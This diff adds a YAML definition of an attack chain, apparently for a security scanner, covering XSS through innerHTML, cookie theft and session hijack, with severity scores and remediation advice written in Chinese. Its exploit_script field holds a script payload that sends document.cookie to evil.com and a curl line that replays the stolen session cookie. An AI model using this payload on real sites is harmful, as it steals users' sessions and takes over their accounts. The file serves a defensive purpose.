@@ -1,0 +1,43 @@
+id: CHAIN-003
+name: "XSS → 会话劫持 → 账户接管"
+severity: HIGH
+cvss: 8.1
+epss: 0.75
+
+steps:
+  - step: 1
+    name: "XSS注入点"
+    rule: js.xss.innerhtml
+    description: "用户输入直接设置innerHTML"
+    condition: "未转义的用户输入渲染到DOM"
+
+  - step: 2
+    name: "Cookie窃取"
+    rule: cookie_theft
+    description: "通过XSS窃取会话Cookie"
+    condition: "document.cookie 可被脚本访问"
+
+  - step: 3
+    name: "会话劫持"
+    rule: session_hijack
+    description: "使用窃取的Cookie冒充用户"
+    condition: "Cookie无HttpOnly标志"
+
+exploit_script: |
+  # Step 1: 注入XSS payload
+  <script>
+  fetch('https://evil.com/steal?c='+document.cookie)
+  </script>
+
+  # Step 2: 等待用户触发，获取Cookie
+  # Step 3: 使用Cookie访问账户
+  curl -b "session=<stolen_cookie>" https://target.com/dashboard
+
+remediation:
+  priority: P0
+  effort: "2小时"
+  suggestions:
+    - "使用textContent替代innerHTML"
+    - "设置Cookie HttpOnly和Secure标志"
+    - "实施CSP策略"
+    - "使用DOMPurify消毒用户输入"
